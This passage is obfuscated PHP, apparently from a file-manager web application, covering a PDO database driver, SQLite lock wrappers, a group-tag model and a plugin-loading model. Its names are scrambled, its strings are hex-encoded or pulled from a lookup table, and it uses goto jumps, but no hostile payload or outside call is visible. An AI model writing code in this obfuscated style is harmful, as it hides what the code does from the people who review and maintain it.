$µÔÕ¡•‹[$œşÄ‰[1007]], $µÔÕ¡•‹[$œşÄ‰[1008]], $µÔÕ¡•‹[$œşÄ‰[17]]); } catch (PDOException $Ñê†Ï²ó) { think_exception($Ñê†Ï²ó->getMessage()); } $this->dbType = $this->_getDsnType($µÔÕ¡•‹[$œşÄ‰[1038]]); if (in_array($this->dbType, array($œşÄ‰[1039], $œşÄ‰[1040], $œşÄ‰[1041], $œşÄ‰[1042]))) { think_exception($œşÄ‰[1043] . $this->dbType . $œşÄ‰[1044] . $this->dbType . $œşÄ‰[1045]); } if (!$this->linkID[$ºĞ“‚¾¡]) { think_exception($œşÄ‰[1046]); } try { $this->linkID[$ºĞ“‚¾¡]->exec($œşÄ‰[1047] . think_config($œşÄ‰[1010])); } catch (Exception $Ñê†Ï²ó) { } $this->connected = !0; if (1 != think_config($œşÄ‰[22])) { unset($this->config); } } return $this->linkID[$ºĞ“‚¾¡]; } public function free() { $this->PDOStatement = null; } public function query($‰ÖÇ£Ûß, $À‚Æ´Ÿ = array()) { $ÔÓıéÄâ =& $_SERVER[”øäÃÍª]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‰ÖÇ£Ûß; if (!empty($À‚Æ´Ÿ)) { $this->queryStr .= $ÔÓıéÄâ[1048] . print_r($À‚Æ´Ÿ, !0) . $ÔÓıéÄâ[1049]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÔÓıéÄâ[23], 1); think_status($ÔÓıéÄâ[24]); $this->PDOStatement = $this->_linkID->prepare($‰ÖÇ£Ûß); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¥¾øõ—Ğ = $this->PDOStatement->execute($À‚Æ´Ÿ); $this->debug(); if (!1 === $¥¾øõ—Ğ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($”ƒó›ñ¸, $•»ãÍ¥¾ = array()) { $ÆúÕìï =& $_SERVER[”øäÃÍª]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $”ƒó›ñ¸; if (!empty($•»ãÍ¥¾)) { $this->queryStr .= $ÆúÕìï[1048] . print_r($•»ãÍ¥¾, !0) . $ÆúÕìï[1049]; } $ôÙÍäÜ = !1; if ($this->dbType == $ÆúÕìï[1042]) { if (preg_match($ÆúÕìï[1050], $this->queryStr, $·Ëç™âç)) { $this->table = think_config($ÆúÕìï[1051]) . str_ireplace(think_config($ÆúÕìï[1052]), $ÆúÕìï[463], $·Ëç™âç[2]); $ôÙÍäÜ = (bool) $this->query($ÆúÕìï[1053] . strtoupper($this->table) . $ÆúÕìï[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÆúÕìï[25], 1); think_status($ÆúÕìï[24]); $this->PDOStatement = $this->_linkID->prepare($”ƒó›ñ¸); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¡”¯ïõ = $this->PDOStatement->execute($•»ãÍ¥¾); $this->debug(); if (!1 === $¡”¯ïõ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ôÙÍäÜ || preg_match($ÆúÕìï[1054], $”ƒó›ñ¸)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $óÈŸâƒ‹ = $this->_linkID->commit(); $this->transTimes = 0; if (!$óÈŸâƒ‹) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¹èªÙ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¹èªÙ) { $this->error(); return !1; } } return !0; } private function getAll() { $Ê¡È’Œ§ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Ê¡È’Œ§); return $Ê¡È’Œ§; } public function getFields($öÅ©‡ÓÚ) { $Í˜ï¥¥§ =& $_SERVER[”øäÃÍª]; $this->initConnect(!0); if (think_config($Í˜ï¥¥§[1055])) { $µöÃñßã = str_replace($Í˜ï¥¥§[1056], $öÅ©‡ÓÚ, think_config($Í˜ï¥¥§[1055])); } else { switch ($this->dbType) { case $Í˜ï¥¥§[1039]: case $Í˜ï¥¥§[1057]: $µöÃñßã = "\123\x45\114\x45\x43\124\x20\40\x20\x63\x6f\154\x75\155\156\x5f\156\141\155\x65\40\141\x73\x20\x27\x4e\x61\155\x65\47\x2c\40\40\x20\x64\x61\x74\x61\x5f\164\x79\160\145\40\141\x73\x20\x27\124\x79\x70\145\x27\54\40\40\40\x63\157\x6c\165\155\156\137\x64\x65\146\141\165\x6c\164\40\141\163\40\47\x44\145\x66\141\x75\x6c\164\47\x2c\x20\x20\x20\x69\x73\x5f\156\165\154\154\141\142\x6c\145\x20\x61\x73\x20\47\x4e\165\x6c\x6c\47\xa\x9\11\x46\x52\117\x4d\x9\151\x6e\146\x6f\162\155\141\164\x69\157\156\137\163\x63\x68\x65\x6d\x61\x2e\164\x61\x62\x6c\145\163\x20\101\x53\40\x74\12\11\11\x4a\x4f\111\116\x9\x69\x6e\x66\157\x72\x6d\141\x74\151\x6f\156\137\x73\x63\150\145\x6d\x61\56\x63\157\154\165\x6d\x6e\163\x20\x41\x53\40\x63\xa\11\x9\117\116\40\x20\x74\x2e\164\x61\x62\x6c\x65\137\x63\x61\x74\141\x6c\157\147\40\x3d\40\143\56\x74\141\x62\x6c\x65\x5f\x63\x61\x74\x61\154\x6f\147\12\x9\x9\101\x4e\x44\x20\164\56\x74\141\142\x6c\x65\x5f\x73\143\x68\145\x6d\x61\40\75\x20\x63\56\164\x61\142\x6c\x65\137\x73\143\150\x65\x6d\x61\12\x9\x9\101\116\x44\x20\164\56\x74\141\142\x6c\x65\x5f\156\141\x6d\145\40\75\x20\x63\x2e\x74\141\142\154\145\x5f\156\x61\x6d\145\12\11\x9\x57\x48\x45\122\105\40\x20\40\x74\56\164\141\142\x6c\145\x5f\156\141\x6d\x65\x20\75\40\47{$öÅ©‡ÓÚ}\x27"; break; case $Í˜ï¥¥§[1058]: $µöÃñßã = $Í˜ï¥¥§[1059] . $öÅ©‡ÓÚ . $Í˜ï¥¥§[1060]; break; case $Í˜ï¥¥§[1040]: case $Í˜ï¥¥§[1042]: $µöÃñßã = $Í˜ï¥¥§[1061] . $Í˜ï¥¥§[1062] . $Í˜ï¥¥§[1063] . strtoupper($öÅ©‡ÓÚ) . $Í˜ï¥¥§[1064] . strtoupper($öÅ©‡ÓÚ) . $Í˜ï¥¥§[1065]; break; case $Í˜ï¥¥§[1066]: $µöÃñßã = $Í˜ï¥¥§[1067] . $öÅ©‡ÓÚ . $Í˜ï¥¥§[1068]; break; case $Í˜ï¥¥§[1041]: break; case $Í˜ï¥¥§[1069]: default: $µöÃñßã = $Í˜ï¥¥§[1070] . ($this->dbType == $Í˜ï¥¥§[1069] ? "\x60{$öÅ©‡ÓÚ}\x60" : $öÅ©‡ÓÚ); } } $ÎçÊ•Ï÷ = $this->query($µöÃñßã); $àĞí¹–Ä = array(); if ($ÎçÊ•Ï÷) { foreach ($ÎçÊ•Ï÷ as $²İ—¨İ¿ => $òˆæ“ù) { $òˆæ“ù = array_change_key_case($òˆæ“ù); $òˆæ“ù[$Í˜ï¥¥§[32]] = isset($òˆæ“ù[$Í˜ï¥¥§[32]]) ? $òˆæ“ù[$Í˜ï¥¥§[32]] : $Í˜ï¥¥§[463]; $òˆæ“ù[$Í˜ï¥¥§[33]] = isset($òˆæ“ù[$Í˜ï¥¥§[33]]) ? $òˆæ“ù[$Í˜ï¥¥§[33]] : $Í˜ï¥¥§[463]; $ªÅ¾çë = isset($òˆæ“ù[$Í˜ï¥¥§[351]]) ? $òˆæ“ù[$Í˜ï¥¥§[351]] : $òˆæ“ù[$Í˜ï¥¥§[32]]; $àĞí¹–Ä[$ªÅ¾çë] = array($Í˜ï¥¥§[32] => $ªÅ¾çë, $Í˜ï¥¥§[33] => $òˆæ“ù[$Í˜ï¥¥§[33]], $Í˜ï¥¥§[35] => (bool) (isset($òˆæ“ù[$Í˜ï¥¥§[103]]) && $òˆæ“ù[$Í˜ï¥¥§[103]] === $Í˜ï¥¥§[12] || isset($òˆæ“ù[$Í˜ï¥¥§[35]]) && $òˆæ“ù[$Í˜ï¥¥§[35]] === $Í˜ï¥¥§[12]), $Í˜ï¥¥§[37] => isset($òˆæ“ù[$Í˜ï¥¥§[37]]) ? $òˆæ“ù[$Í˜ï¥¥§[37]] : (isset($òˆæ“ù[$Í˜ï¥¥§[56]]) ? $òˆæ“ù[$Í˜ï¥¥§[56]] : $Í˜ï¥¥§[463]), $Í˜ï¥¥§[39] => isset($òˆæ“ù[$Í˜ï¥¥§[95]]) ? strtolower($òˆæ“ù[$Í˜ï¥¥§[95]]) == $Í˜ï¥¥§[41] : (isset($òˆæ“ù[$Í˜ï¥¥§[57]]) ? $òˆæ“ù[$Í˜ï¥¥§[57]] : !1), $Í˜ï¥¥§[42] => isset($òˆæ“ù[$Í˜ï¥¥§[1071]]) ? strtolower($òˆæ“ù[$Í˜ï¥¥§[1071]]) == $Í˜ï¥¥§[44] : (isset($òˆæ“ù[$Í˜ï¥¥§[95]]) ? $òˆæ“ù[$Í˜ï¥¥§[95]] : !1)); } } return $àĞí¹–Ä; } public function getTables($É¢ƒã¨ = '') { $û÷ß§Äƒ =& $_SERVER[”øäÃÍª]; if (think_config($û÷ß§Äƒ[1072])) { $˜Í˜ìˆ¤ = str_replace($û÷ß§Äƒ[1073], $É¢ƒã¨, think_config($û÷ß§Äƒ[1072])); } else { switch ($this->dbType) { case $û÷ß§Äƒ[1040]: case $û÷ß§Äƒ[1042]: $˜Í˜ìˆ¤ = $û÷ß§Äƒ[1074]; break; case $û÷ß§Äƒ[1039]: case $û÷ß§Äƒ[1057]: $˜Í˜ìˆ¤ = $û÷ß§Äƒ[1075]; break; case $û÷ß§Äƒ[1066]: $˜Í˜ìˆ¤ = $û÷ß§Äƒ[1076]; break; case $û÷ß§Äƒ[1041]: think_exception(think_lang($û÷ß§Äƒ[1077]) . $û÷ß§Äƒ[1078]); break; case $û÷ß§Äƒ[1058]: $˜Í˜ìˆ¤ = $û÷ß§Äƒ[45] . $û÷ß§Äƒ[46] . $û÷ß§Äƒ[47]; break; case $û÷ß§Äƒ[1069]: default: if (!empty($É¢ƒã¨)) { $˜Í˜ìˆ¤ = $û÷ß§Äƒ[1018] . $É¢ƒã¨ . $û÷ß§Äƒ[1019]; } else { $˜Í˜ìˆ¤ = $û÷ß§Äƒ[1020]; } } } $Æ÷Ë»® = $this->query($˜Í˜ìˆ¤); $§ìÌĞÛ© = array(); foreach ($Æ÷Ë»® as $‡€ùÒ·ß => $Íºï†ÙŠ) { $§ìÌĞÛ©[$‡€ùÒ·ß] = current($Íºï†ÙŠ); } return $§ìÌĞÛ©; } protected function parseLimit($ü”Ñ«†Æ) { $†ÓİÊ…³ =& $_SERVER[”øäÃÍª]; $•ğò‡Ò÷ = $†ÓİÊ…³[12]; if (!empty($ü”Ñ«†Æ)) { switch ($this->dbType) { case $†ÓİÊ…³[1066]: case $†ÓİÊ…³[1058]: $ü”Ñ«†Æ = explode($†ÓİÊ…³[50], $ü”Ñ«†Æ); if (count($ü”Ñ«†Æ) > 1) { $•ğò‡Ò÷ .= $†ÓİÊ…³[51] . $ü”Ñ«†Æ[1] . $†ÓİÊ…³[52] . $ü”Ñ«†Æ[0] . $†ÓİÊ…³[53]; } else { $•ğò‡Ò÷ .= $†ÓİÊ…³[51] . $ü”Ñ«†Æ[0] . $†ÓİÊ…³[53]; } break; case $†ÓİÊ…³[1039]: case $†ÓİÊ…³[1057]: break; case $†ÓİÊ…³[1041]: break; case $†ÓİÊ…³[1040]: case $†ÓİÊ…³[1042]: break; case $†ÓİÊ…³[1069]: default: $•ğò‡Ò÷ .= $†ÓİÊ…³[51] . $ü”Ñ«†Æ . $†ÓİÊ…³[53]; } } return $•ğò‡Ò÷; } public function parseKey(&$›™÷çÄÌ, $¢Ü×ğÅ = true) { $«»Û”Œ =& $_SERVER[”øäÃÍª]; if ($¢Ü×ğÅ) { $›™÷çÄÌ = $this->parseKeyCheck($›™÷çÄÌ); } if ($this->dbType == $«»Û”Œ[1069]) { if ($›™÷çÄÌ != $«»Û”Œ[220] && !preg_match($«»Û”Œ[1033], $›™÷çÄÌ)) { $›™÷çÄÌ = $«»Û”Œ[475] . trim($›™÷çÄÌ, $«»Û”Œ[475]) . $«»Û”Œ[475]; } return $›™÷çÄÌ; } else { return parent::parseKey($›™÷çÄÌ, $¢Ü×ğÅ); } } public function close() { $this->_linkID = null; } public function error() { $€°Úƒ» =& $_SERVER[”øäÃÍª]; if ($this->PDOStatement) { $œ¼çûéä = $this->PDOStatement->errorInfo(); $this->error = $œ¼çûéä[1] . $€°Úƒ»[4] . $œ¼çûéä[2]; } else { $this->error = $€°Úƒ»[12]; } if ($€°Úƒ»[12] != $this->queryStr) { $this->error .= LNG($€°Úƒ»[48]) . $this->queryStr; } think_trace($this->error, $€°Úƒ»[12], $€°Úƒ»[49]); return $this->error; } public function escapeString($Í÷Å€„æ) { $ÑşËé™ =& $_SERVER[”øäÃÍª]; switch ($this->dbType) { case $ÑşËé™[1066]: case $ÑşËé™[1039]: case $ÑşËé™[1057]: case $ÑşËé™[1069]: return addslashes($Í÷Å€„æ); case $ÑşËé™[1041]: case $ÑşËé™[1058]: case $ÑşËé™[1040]: case $ÑşËé™[1042]: return str_ireplace($ÑşËé™[58], $ÑşËé™[59], $Í÷Å€„æ); } } protected function parseValue($Ï£¡§°¤) { $ëíù¾¨£ =& $_SERVER[”øäÃÍª]; if (is_string($Ï£¡§°¤)) { $‚‹²˜‰Å = strpos($Ï£¡§°¤, $ëíù¾¨£[4]) === 0 && in_array($Ï£¡§°¤, array_keys($this->bind)); $Ï£¡§°¤ = $‚‹²˜‰Å ? $this->escapeString($Ï£¡§°¤) : $ëíù¾¨£[1079] . $this->escapeString($Ï£¡§°¤) . $ëíù¾¨£[1079]; } elseif (isset($Ï£¡§°¤[0]) && is_string($Ï£¡§°¤[0]) && strtolower($Ï£¡§°¤[0]) == $ëíù¾¨£[372]) { $Ï£¡§°¤ = $this->escapeString($Ï£¡§°¤[1]); } elseif (is_array($Ï£¡§°¤)) { $Ï£¡§°¤ = array_map(array($this, $ëíù¾¨£[1080]), $Ï£¡§°¤); } elseif (is_bool($Ï£¡§°¤)) { $Ï£¡§°¤ = $Ï£¡§°¤ ? $ëíù¾¨£[91] : $ëíù¾¨£[228]; } elseif (is_null($Ï£¡§°¤)) { $Ï£¡§°¤ = $ëíù¾¨£[103]; } return $Ï£¡§°¤; } public function getLastInsertId() { $íıÙ–÷¥ =& $_SERVER[”øäÃÍª]; switch ($this->dbType) { case $íıÙ–÷¥[1066]: case $íıÙ–÷¥[1058]: case $íıÙ–÷¥[1039]: case $íıÙ–÷¥[1057]: case $íıÙ–÷¥[1041]: case $íıÙ–÷¥[1069]: return $this->_linkID->lastInsertId(); case $íıÙ–÷¥[1040]: case $íıÙ–÷¥[1042]: $İëÌÌ÷ = $this->table; $§·ÉÕİ  = $this->query("\x53\105\114\x45\103\x54\x20{$İëÌÌ÷}\x2e\x63\165\x72\x72\x76\x61\154\x20\x63\165\162\162\x76\141\x6c\40\106\x52\x4f\115\40\144\165\141\154"); return $§·ÉÕİ  ? $§·ÉÕİ [0][$íıÙ–÷¥[1081]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($™Ä«©¼) { $ŠÁÀ²’ =& $_SERVER[”øäÃÍª]; if (!CacheLock::fileLock($ŠÁÀ²’[13])) { return !1; } $ñ±òÍÔ = parent::query($™Ä«©¼); CacheLock::fileUnLock($ŠÁÀ²’[13]); return $ñ±òÍÔ; } public function execute($ì´¶³†¨) { $…»•üÉ =& $_SERVER[”øäÃÍª]; if (!CacheLock::fileLock($…»•üÉ[13])) { return !1; } $Ü¸Ù¦şğ = parent::execute($ì´¶³†¨); CacheLock::fileUnLock($…»•üÉ[13]); return $Ü¸Ù¦şğ; } } class DbSqlite3 extends DbSqlite3Base { public function query($ı°Ğ îË) { $¨§¶æ÷ö =& $_SERVER[”øäÃÍª]; if (!CacheLock::fileLock($¨§¶æ÷ö[13])) { return !1; } $ñ½š–Ò = parent::query($ı°Ğ îË); CacheLock::fileUnLock($¨§¶æ÷ö[13]); return $ñ½š–Ò; } public function execute($æØÑÌ–“) { $ù¿‰Šãü =& $_SERVER[”øäÃÍª]; if (!CacheLock::fileLock($ù¿‰Šãü[13])) { return !1; } $ÖˆšûÆÇ = parent::execute($æØÑÌ–“); CacheLock::fileUnLock($ù¿‰Šãü[13]); return $ÖˆšûÆÇ; } } goto C„¶­Åù¨; aÜœ˜‚•ù§: class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\137\146\141\x76"; protected function cacheFunctionAlias($¯´ÙÌ“ê) { $»Ñ† ìà =& $_SERVER[”øäÃÍª]; return array($»Ñ† ìà[2250] => array($¯´ÙÌ“ê[0], $»Ñ† ìà[2251]), $»Ñ† ìà[2252] => array($¯´ÙÌ“ê[0], $»Ñ† ìà[2253])); } protected function ___get($¥Õ—¶ó·) { $Ø„ÕÚƒ =& $_SERVER[”øäÃÍª]; $ôÖÈîĞ = Model($Ø„ÕÚƒ[613])->metaGet($¥Õ—¶ó·, $Ø„ÕÚƒ[2254]); $Ä”œáş‰ = json_decode($ôÖÈîĞ, !0); return $Ä”œáş‰ ? $Ä”œáş‰ : array($Ø„ÕÚƒ[2255] => $Ø„ÕÚƒ[91], $Ø„ÕÚƒ[446] => array()); } protected function ___listData($œˆÅÂ›å) { $Æµïá¿¥ =& $_SERVER[”øäÃÍª]; $š­àšÆë = array($Æµïá¿¥[1925] => 0, $Æµïá¿¥[581] => array($Æµïá¿¥[2256], 0), $Æµïá¿¥[519] => $Æµïá¿¥[1446] . $œˆÅÂ›å); $½êúÌ°† = $Æµïá¿¥[2257]; $®´êæÜ = $this->field($½êúÌ°†)->where($š­àšÆë)->order($Æµïá¿¥[2258])->select(); return $®´êæÜ ? $®´êæÜ : array(); } protected function set($ê•”éÈæ, $ùŠËê½) { $¸äøÙ«İ =& $_SERVER[”øäÃÍª]; $ùŠËê½ = $ùŠËê½ ? $ùŠËê½ : array($¸äøÙ«İ[2255] => $¸äøÙ«İ[91], $¸äøÙ«İ[446] => array()); return Model($¸äøÙ«İ[613])->metaSet($ê•”éÈæ, $¸äøÙ«İ[2254], json_encode($ùŠËê½)); } protected function getByTagID($ÏÚÏùÅØ, $€·œ˜öµ) { $„ñª¬» =& $_SERVER[”øäÃÍª]; if (!$ÏÚÏùÅØ || !$€·œ˜öµ) { return !1; } if (!Model($„ñª¬»[613])->getInfoSimple($ÏÚÏùÅØ)) { return !1; } $±Ãúı = $this->get($ÏÚÏùÅØ); if (!$±Ãúı || !isset($±Ãúı[$„ñª¬»[446]])) { return !1; } $™¢¨æÉÎ = array_find_by_field($±Ãúı[$„ñª¬»[446]], $„ñª¬»[487], $€·œ˜öµ); return is_array($™¢¨æÉÎ) ? $™¢¨æÉÎ : !1; } public function listSource($¦«·›Ë©, $ôó‰ŞÚõ) { $ßÕ»¸şİ =& $_SERVER[”øäÃÍª]; if ($ôó‰ŞÚõ && !is_array($ôó‰ŞÚõ)) { $ôó‰ŞÚõ = array($ôó‰ŞÚõ); } $ áòÅòÖ = $this->get($¦«·›Ë©); $éÌüÆ = array_to_keyvalue($ áòÅòÖ[$ßÕ»¸şİ[446]], $ßÕ»¸şİ[487]); $î•Ÿ­¶ = array_to_keyvalue($ áòÅòÖ[$ßÕ»¸şİ[606]], $ßÕ»¸şİ[487]); $–¦¯Îµ² = $this->listData($¦«·›Ë©); $Îµ¶Œ = array(); foreach ($ôó‰ŞÚõ as $Û±©¤ÎÓ) { $¡ ³ôû = $éÌüÆ[$Û±©¤ÎÓ]; $˜›„ôı‘ = _get($¡ ³ôû, $ßÕ»¸şİ[606]); if (!$¡ ³ôû || !$˜›„ôı‘ || !$î•Ÿ­¶[$˜›„ôı‘]) { continue; } if (!$Îµ¶Œ[$˜›„ôı‘]) { $Îµ¶Œ[$˜›„ôı‘] = array(); } $Îµ¶Œ[$˜›„ôı‘][] = $Û±©¤ÎÓ; } $ò—Ûë = array(); $‚á°åœ = array(); foreach ($–¦¯Îµ² as $­ÑÔ‘•Ò) { $Êà„Á = $­ÑÔ‘•Ò[$ßÕ»¸şİ[87]]; $¡ ³ôû = $éÌüÆ[$­ÑÔ‘•Ò[$ßÕ»¸şİ[523]]]; $˜›„ôı‘ = _get($¡ ³ôû, $ßÕ»¸şİ[606]); if (!$¡ ³ôû || !$˜›„ôı‘ || !$Îµ¶Œ[$˜›„ôı‘] || !$Êà„Á) { continue; } if (!in_array($­ÑÔ‘•Ò[$ßÕ»¸şİ[523]], $Îµ¶Œ[$˜›„ôı‘])) { continue; } if (!$ò—Ûë[$Êà„Á]) { $ò—Ûë[$Êà„Á] = array(); } $ò—Ûë[$Êà„Á][] = $˜›„ôı‘; } foreach ($ò—Ûë as $Êà„Á => $û¥ıØÅò) { if (count($û¥ıØÅò) != count($Îµ¶Œ)) { continue; } $‚á°åœ[] = $Êà„Á; } if (!$ôó‰ŞÚõ) { $‚á°åœ = array_to_keyvalue($–¦¯Îµ², $ßÕ»¸şİ[12], $ßÕ»¸şİ[87]); } $‚á°åœ = array_unique($‚á°åœ); if (!$‚á°åœ) { return array(); } $±í¸„ùı = array($ßÕ»¸şİ[514] => array($ßÕ»¸şİ[515], $‚á°åœ), $ßÕ»¸şİ[597] => $¦«·›Ë©, $ßÕ»¸şİ[188] => SourceModel::TYPE_GROUP); $äÙÃğÊà = Model($ßÕ»¸şİ[1488])->listSource($±í¸„ùı); if (!$äÙÃğÊà || count($‚á°åœ) == $äÙÃğÊà[$ßÕ»¸şİ[443]][$ßÕ»¸şİ[444]]) { return $äÙÃğÊà; } $ñë«ŒÄÜ = array(); $ô…ËáÅ½ = array_to_keyvalue($äÙÃğÊà[$ßÕ»¸şİ[85]], $ßÕ»¸şİ[12], $ßÕ»¸şİ[191]); $“…îØÕ‘ = array_to_keyvalue($äÙÃğÊà[$ßÕ»¸şİ[86]], $ßÕ»¸şİ[12], $ßÕ»¸şİ[191]); $ô£É‡”Ñ = array_merge($“…îØÕ‘, $ô…ËáÅ½); foreach ($‚á°åœ as $Êà„Á) { if (!in_array($Êà„Á, $ô£É‡”Ñ)) { $ñë«ŒÄÜ[] = $Êà„Á; } } if ($ñë«ŒÄÜ) { $this->removeBySource($¦«·›Ë©, $ñë«ŒÄÜ); } return $äÙÃğÊà; } protected function addToTag($¢ŠëÛÔ, $‹Ê”ŒÕ, $Ï‰“£ë) { $ù×¶‘æ =& $_SERVER[”øäÃÍª]; if (!$this->getByTagID($¢ŠëÛÔ, $Ï‰“£ë) || !$‹Ê”ŒÕ) { return !1; } if (!Model($ù×¶‘æ[941])->pathInfo($‹Ê”ŒÕ)) { return !1; } $”µæ¥úŸ = array($ù×¶‘æ[1925] => 0, $ù×¶‘æ[581] => $Ï‰“£ë, $ù×¶‘æ[518] => $‹Ê”ŒÕ, $ù×¶‘æ[519] => $ù×¶‘æ[2259] . $¢ŠëÛÔ, $ù×¶‘æ[517] => $ù×¶‘æ[12], $ù×¶‘æ[2144] => 0); if ($this->where($”µæ¥úŸ)->find()) { return !1; } return $this->add($”µæ¥úŸ); } protected function removeFromTag($ãÜ©°, $¶Ç’´ÆÃ, $øÇæ´Í³) { $´ÑìÇëæ =& $_SERVER[”øäÃÍª]; if (!$this->getByTagID($ãÜ©°, $øÇæ´Í³) || !$¶Ç’´ÆÃ) { return !1; } if (is_array($¶Ç’´ÆÃ)) { $¶Ç’´ÆÃ = array($´ÑìÇëæ[7], $¶Ç’´ÆÃ); } $÷æ·øş = array($´ÑìÇëæ[1925] => 0, $´ÑìÇëæ[581] => $øÇæ´Í³, $´ÑìÇëæ[519] => $´ÑìÇëæ[2259] . $ãÜ©°, $´ÑìÇëæ[518] => $¶Ç’´ÆÃ); return $this->where($÷æ·øş)->delete(); } protected function removeByTag($¶”ÙÓäæ, $»è©ö™ç) { $¶½Ã¨¬Ø =& $_SERVER[”øäÃÍª]; if (!$this->getByTagID($¶”ÙÓäæ, $»è©ö™ç)) { return !1; } $¤¡¼¢Í = array($¶½Ã¨¬Ø[1925] => 0, $¶½Ã¨¬Ø[581] => $»è©ö™ç, $¶½Ã¨¬Ø[519] => $¶½Ã¨¬Ø[2259] . $¶”ÙÓäæ); return $this->where($¤¡¼¢Í)->delete(); } protected function removeBySource($®æ•ïü¤, $—ØäüİÀ) { $ş©Œ‡ =& $_SERVER[”øäÃÍª]; if (!$®æ•ïü¤ || !$—ØäüİÀ) { return !1; } if (is_array($—ØäüİÀ)) { $—ØäüİÀ = array($ş©Œ‡[7], $—ØäüİÀ); } $‘™³ê–Ú = array($ş©Œ‡[1925] => 0, $ş©Œ‡[518] => $—ØäüİÀ, $ş©Œ‡[581] => array($ş©Œ‡[1136], 0), $ş©Œ‡[519] => $ş©Œ‡[2259] . $®æ•ïü¤); return $this->where($‘™³ê–Ú)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\x2e\x70\154\x75\x67\151\x6e\114\151\x73\164"; public $field = array("\x6e\x61\x6d\145", "\x73\164\x61\164\x75\163", "\x72\x65\147\151\x65\x73\164", "\143\157\x6e\146\151\x67"); public function loadList($®Ñ½’²‘ = false) { $éĞ½¹¾´ = array_to_keyvalue($this->listData(), $_SERVER[”øäÃÍª][32]); if ($®Ñ½’²‘) { return $éĞ½¹¾´[$®Ñ½’²‘]; } return $éĞ½¹¾´; } public function init() { $øüŠè² =& $_SERVER[”øäÃÍª]; Hook::trigger($øüŠè²[2260]); $«³Í“§ = $this->loadPluginList(); foreach ($«³Í“§ as $…‹Ç²ò³ => $Õñ×¡) { $¶Äî¯ß = $this->appAllow($…‹Ç²ò³, $Õñ×¡); if (!$¶Äî¯ß) { continue; } foreach ($Õñ×¡[$øüŠè²[2261]] as $ŒÕ‘æåé => $í¾Éó±) { Hook::bind($ŒÕ‘æåé, $í¾Éó±); } } Hook::trigger($øüŠè²[2262]); Hook::trigger(ACTION); } public function appAllow($¥è˜òø, $¶Û¨¢«ş, $Ì«°¢„Œ = true) { $¡üöØä =& $_SERVER[”øäÃÍª]; $ú¤››ô = PLUGIN_DIR . $¥è˜òø . $¡üöØä[2263]; if (!is_array($¶Û¨¢«ş) || !is_array($¶Û¨¢«ş[$¡üöØä[2261]]) || $¶Û¨¢«ş[$¡üöØä[859]] != 1 || !is_file($ú¤››ô)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$¡üöØä[6]][$¡üöØä[2264]] || !$GLOBALS[$¡üöØä[6]][$¡üöØä[2265]]) { return !0; } $Á¦¹×ã› = explode($¡üöØä[50], strtolower($GLOBALS[$¡üöØä[6]][$¡üöØä[2265]])); return in_array(strtolower($¥è˜òø), $Á¦¹×ã›) ? !1 : !0; } if ($Ì«°¢„Œ && !Action($¡üöØä[2266])->checkAuth($¥è˜òø)) { return !1; } return !0; } public function unInstall($ÌªÙÇŠÇ) { $§Á©»˜ =& $_SERVER[”øäÃÍª]; $îŒû—ÈÛ = $this->loadList($ÌªÙÇŠÇ); if (file_exists(PLUGIN_DIR . $ÌªÙÇŠÇ)) { Hook::apply($ÌªÙÇŠÇ . $§Á©»˜[2267]); } $this->remove($îŒû—ÈÛ[$§Á©»˜[487]]); } public function changeStatus($ ÷ë‡›, $„ÛŠ×ˆ€) { $€Ï‘–¢‰ =& $_SERVER[”øäÃÍª]; $¬‰¼ßŸ = $this->loadList($ ÷ë‡›); if ($„ÛŠ×ˆ€) { Hook::apply($ ÷ë‡› . $€Ï‘–¢‰[2268]); } $this->update($¬‰¼ßŸ[$€Ï‘–¢‰[487]], array($€Ï‘–¢‰[2269] => $„ÛŠ×ˆ€)); } public function appRegist($ÉÁÛ—², $š•ˆßÛ) { $½Ÿñïàú =& $_SERVER[”øäÃÍª]; $ÙâŒ»Ü = $this->loadList($ÉÁÛ—²); if ($ÙâŒ»Ü) { $this->update($ÙâŒ»Ü[$½Ÿñïàú[487]], array($½Ÿñïàú[2261] => $š•ˆßÛ)); } else { $‚ùñ§Ç¶ = array($½Ÿñïàú[32] => $ÉÁÛ—², $½Ÿñïàú[2261] => $š•ˆßÛ, $½Ÿñïàú[859] => 0, $½Ÿñïàú[6] => $this->getConfigDefault($ÉÁÛ—²)); $this->insert($‚ùñ§Ç¶); } } public function getConfigDefault($§Óã´£Â) { $Ü›«ÖÒ =& $_SERVER[”øäÃÍª]; $ÑŠ«ş± = array(); $ò†¹ = $this->getPackageJson($§Óã´£Â); if (!$ò†¹ && is_array($ò†¹[$Ü›«ÖÒ[2270]])) { return $ÑŠ«ş±; } foreach ($ò†¹[$Ü›«ÖÒ[2270]] as $×‡í³Ç¡ => $•Ù·€¸Î) { if (!isset($•Ù·€¸Î[$Ü›«ÖÒ[451]]) || isset($ÑŠ«ş±[$×‡í³Ç¡])) { continue; } $ÑŠ«ş±[$×‡í³Ç¡] = $•Ù·€¸Î[$Ü›«ÖÒ[451]]; } return $ÑŠ«ş±; } public function getPackageJson($İ±‹äšÌ) { return Hook::apply($İ±‹äšÌ . $_SERVER[”øäÃÍª][2271]); } public function getConfig($ñ¶›‡¢, $Á†˜—§Ğ = false) { $ó‰ÊËè =& $_SERVER[”øäÃÍª]; $Ï“×ô’Í = array(); $…·ÒËŒ· = $this->loadList($ñ¶›‡¢); if ($…·ÒËŒ· && is_array($…·ÒËŒ·[$ó‰ÊËè[6]])) { $Ï“×ô’Í = $…·ÒËŒ·[$ó‰ÊËè[6]]; } if 